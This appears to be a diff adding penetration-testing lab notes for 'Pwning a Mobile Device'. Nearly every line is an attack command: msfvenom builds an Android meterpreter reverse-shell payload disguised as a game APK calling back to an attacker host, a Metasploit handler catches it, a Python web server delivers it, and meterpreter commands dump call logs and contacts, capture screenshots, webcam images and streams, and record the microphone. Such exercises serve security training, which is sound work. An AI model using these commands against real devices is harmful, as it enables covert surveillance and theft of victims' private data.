@@ -1,0 +1,33 @@
+4.5.1 ACTIVITY - Pwning a Mobile Device
+
+cd ~
+mkdir android
+
+sudo msfvenom --platform android -a java -p android/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f raw -o warcraft_mini.apk
+
+mv warcraft_mini.apk ~/android
+
+cd ~/android
+ls
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.40.129
+set LPORT 8888
+show options
+run
+
+python3 -m http.server
+
+http://<kali IP>:8000/ 
+
+?
+dump_calllog
+dump_contacts
+screenshot
+webcam_snap
+webcam_stream
+Ctrl+c
+?
+record_mic -h
+record_mic -d 20
